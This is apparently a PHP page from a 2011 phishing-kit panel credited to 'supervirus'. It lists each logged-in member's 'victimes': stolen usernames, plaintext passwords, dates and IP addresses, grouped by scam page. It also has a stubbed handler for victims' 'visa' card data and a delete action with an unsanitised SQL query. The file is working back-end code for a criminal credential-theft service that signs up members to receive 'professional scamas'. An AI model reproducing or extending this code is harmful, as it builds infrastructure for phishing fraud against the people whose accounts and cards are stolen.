<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################

switch($type){
	case '';
	if(user_level == 0){
		echo ' <div class="head_panel">.: Victimes Control  :.</div>	
				<div class="body_panel">
				Soory You Must Be Member To See Your Vistimes  <br />
				Sing Up for Get Your Profisionel Scamas <br />
				<a href="?do=register">Sing Up Here</a>
				</div>';
	}else{
		echo '<div class="head_panel">.: Victimes Control :.</div>	
				<div class="body_panel">
			<table border="1" width="100%">
				<tr class="tr3">
					<td width="48" align="center" height="32">#</td>
					<td align="center" height="32">Scama Disc</td>
					<td align="center" height="32">User name</td>
					<td align="center" height="32">User Pass</td>
					<td align="center" height="32">Date</td>
					<td align="center" height="32">Victime Ip</td>
					<td align="center" height="32">Option </td>
				</tr>';
		$cod_sql = "SELECT victime_id,victime_user,victime_password,victime_date,victime_ip,victime_scama FROM ".prifex."victims WHERE victime_user_id = '".user_id."' AND victime_deleted != '1' ORDER BY victime_id DESC";
		$sql_select_all_victims = mysql_query($cod_sql) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	 	$num_sql_victims_info = mysql_num_rows($sql_select_all_victims);
		if($num_sql_victims_info > 0){	
			while($row_victims_info = mysql_fetch_object($sql_select_all_victims)){
			$victime_id = $row_victims_info->victime_id;
			$victime_user = htmlspecialchars($row_victims_info->victime_user);
			$victime_password = htmlspecialchars($row_victims_info->victime_password);
			$victime_date = $row_victims_info->victime_date;
			$victime_ip = $row_victims_info->victime_ip;
			$victime_scama = $row_victims_info->victime_scama;
			$victime_scama = scama_det_info('scama_desc',$victime_scama);
echo '				<tr class="tr1">
					<td width="48" align="center">'.$victime_id.'</td>
					<td align="center">'.$victime_scama.'</td>
					<td align="center">'.$victime_user.'</td>
					<td align="center">'.$victime_password.'</td>
					<td align="center">'.date_normal($victime_date).'</td>
					<td align="center"><b><font color="#00FF00">'.$victime_ip.'</font></b></td>
					<td align="center"><a onclick="return confirm(\'Are You Sur To Delet This Victime\');" href="?do=victims&type=delet_victim&id='.$victime_id.'">
				<img alt="Delet Victime"  src="image/folder_delete.gif" border="0"></a></td>
				</tr>';
			}
		}else{
		echo '<tr class="tr1">
			<td  colspan="7" height="32" align="center">
				There is Not Victimes Now
			</td>
		</tr>';
		}
			echo '</table>
		</div>';
	}
	break;
	case 'trans_victim':
	if(user_level > 0){
	$victime_id = trim(intval($_GET['victime_id']));
	$id_comp = trim(intval($_GET['id_comp']));
	if(!isset($victime_id) OR empty($victime_id) OR $victime_id == ''){
	  	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Should Select Any visa Info
				</div>';	
	}else{
		if(!isset($id_comp) OR empty($id_comp) OR $id_comp == ''){
		echo '<div class="head_panel">.: Victimes Visas Control  :.</div>	
					<div class="body_panel">
						<center>	Is Stoped Now</center>';
		}else{
			echo '<div class="head_panel">.: User Control  :.</div>	
						<div class="body_panel">
							<center>	Is Stoped Now</center>
						</div>';
			  redirect();
		}
	}
	  	  }else{
	  	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Don\'t Have a Permition
				</div>';
	  }
	break;
	case 'delet_victim':
	if(user_level > 0){
	$cod_sql = "UPDATE ".prifex."victims SET victime_deleted = '1' WHERE victime_id = '$id'";
	$sql_select_scama_id = @mysql_query($cod_sql) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					Deleted victime Done 
				</div>';
	  redirect();
	  }else{
	  	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Don\'t Have a Permition
				</div>';
	  }
	break;
}
	
?>